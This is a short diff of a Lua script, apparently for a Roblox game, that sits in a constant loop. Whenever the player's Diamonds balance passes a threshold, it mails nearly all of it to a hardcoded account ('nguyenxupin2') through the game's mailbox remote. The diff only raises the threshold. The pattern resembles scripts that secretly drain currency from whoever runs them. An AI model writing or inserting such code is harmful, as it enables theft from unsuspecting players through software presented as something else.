@@ -57,13 +57,13 @@ while task.wait() do
 	end
 	for i, v in pairs(GetSave().Inventory.Currency) do
 		if v.id == "Diamonds" then
-			if v._am >= 1000000 then
+			if v._am >= 2000000 then
 				local args = {
 					[1] = "nguyenxupin2",
 					[2] = v.id,
 					[3] = "Currency",
 					[4] = i,
-					[5] = 1000000 - 10000
+					[5] = 2000000 - 10000
 				}
 				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 			end
